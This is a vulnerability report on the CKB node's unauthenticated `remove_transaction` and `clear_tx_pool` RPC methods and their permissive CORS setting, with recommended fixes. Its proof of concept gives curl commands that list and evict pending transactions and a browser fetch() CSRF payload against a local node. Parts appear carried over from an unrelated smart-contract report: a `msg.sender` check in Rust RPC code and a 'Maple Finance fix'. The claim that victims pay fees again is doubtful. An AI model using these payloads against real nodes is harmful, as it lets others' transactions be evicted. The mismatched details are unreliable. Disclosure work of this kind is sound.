### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Any Pending Transaction from the Pool — (`rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` RPC method in the `Pool` module accepts only a `tx_hash` and removes the matching transaction plus all its descendants from the mempool. There is no check that the caller is the original submitter of the transaction. Any RPC-reachable caller — including a malicious web page exploiting the permissive CORS policy — can silently evict any pending transaction submitted by any user, forcing costly resubmission and enabling targeted griefing of time-sensitive operations.

---

### Finding Description

**Root cause — no caller identity check in `remove_transaction`:**

`rpc/src/module/pool.rs` lines 254–255 declare the RPC method:

```rust
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

The implementation at lines 662–669 is:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

There is no check that `msg.sender` (the RPC caller) is the party who originally submitted the transaction. The only input is the `tx_hash`, which is publicly observable via `get_raw_tx_pool`.

**Permissive CORS widens the attack surface:**

`rpc/src/server.rs` line 124 applies `.layer(CorsLayer::permissive())` to the HTTP server with no authentication middleware anywhere in the stack. The default listen address is `127.0.0.1:8114` (`resource/ckb.toml` line 182), but `CorsLayer::permissive()` means any web origin — including a malicious webpage loaded in the victim's browser — can issue cross-origin `POST` requests to `http://127.0.0.1:8114` and invoke `remove_transaction`. No local network access is required; only a browser tab is needed.

**The `Pool` module is enabled by default:**

`resource/ckb.toml` line 190 includes `"Pool"` in the default `modules` list, so `remove_transaction` is active on every standard node deployment.

**Attack path:**

1. Victim submits a pending transaction; its hash is visible via `get_raw_tx_pool`.
2. Attacker (via public RPC exposure or CSRF from a malicious webpage) calls:
   ```json
   {"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"],"id":1}
   ```
3. The transaction and all its descendants are silently removed from the pool.
4. Victim's transaction never confirms; victim must resubmit (paying fees again).

---

### Impact Explanation

- **Griefing / forced resubmission:** Any pending transaction can be evicted by an unprivileged caller. The victim must resubmit and pay fees again.
- **Financial loss for time-sensitive transactions:** Arbitrage, liquidations, DAO votes, or time-locked operations that depend on prompt confirmation can be repeatedly evicted, causing the window to expire and resulting in direct financial loss.
- **Cascade removal:** `remove_entry_and_descendants` (called via `remove_tx` in `tx-pool/src/pool.rs` line 358–360) removes the target transaction **and all dependent transactions**, amplifying the damage when a transaction chain is in flight.
- **`clear_tx_pool` is even more severe:** The same module exposes `clear_tx_pool` (lines 322–323) with identical absence of authorization, allowing a single call to wipe the entire mempool.

---

### Likelihood Explanation

- **No privilege required:** The attacker needs only network access to the RPC port or the ability to load a webpage in the victim's browser.
- **Tx hashes are public:** `get_raw_tx_pool` is also in the default `Pool` module and requires no authentication, so the attacker can enumerate all pending hashes before targeting specific ones.
- **CSRF is trivially weaponizable:** `CorsLayer::permissive()` removes the browser's same-origin protection. A single `fetch()` call from any webpage suffices.
- **Public RPC exposure is common:** Many node operators, dApp backends, and block explorers expose the RPC port on non-localhost addresses, making the attack directly reachable without CSRF.

---

### Recommendation

Add a caller-identity guard analogous to the Maple Finance fix. Since CKB's RPC has no cryptographic caller identity, the practical mitigations are:

1. **Move `remove_transaction` and `clear_tx_pool` to a separate restricted module** (e.g., a new `Admin` module) that is disabled by default and documented as requiring firewall protection, separate from the general `Pool` module.
2. **Remove `CorsLayer::permissive()`** or replace it with an explicit allowlist (`CorsLayer::new().allow_origins([...])`), so browsers enforce the same-origin policy and CSRF is blocked.
3. **Add an optional token/secret header** to the RPC server configuration that state-mutating pool management methods must present, analogous to Bitcoin Core's `rpcauth`.

### Proof of Concept

**Step 1 — Observe pending transactions (no auth required):**
```bash
curl -s http://127.0.0.1:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'
# Returns list of all pending tx hashes
```

**Step 2 — Remove a victim's transaction (no auth required):**
```bash
curl -s http://127.0.0.1:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction",
       "params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],
       "id":2}'
# Returns: {"result":true,...}  — transaction evicted, no credentials needed
```

**Step 3 — CSRF variant (malicious webpage, victim on localhost):**
```javascript
// Loaded in victim's browser tab from any origin
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", method: "remove_transaction",
    params: ["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],
    id: 1
  })
});
// Succeeds because CorsLayer::permissive() allows all origins
```

**Expected outcome:** The victim's pending transaction is removed from the pool without any authorization. The victim's transaction never confirms; they must resubmit and pay fees again.
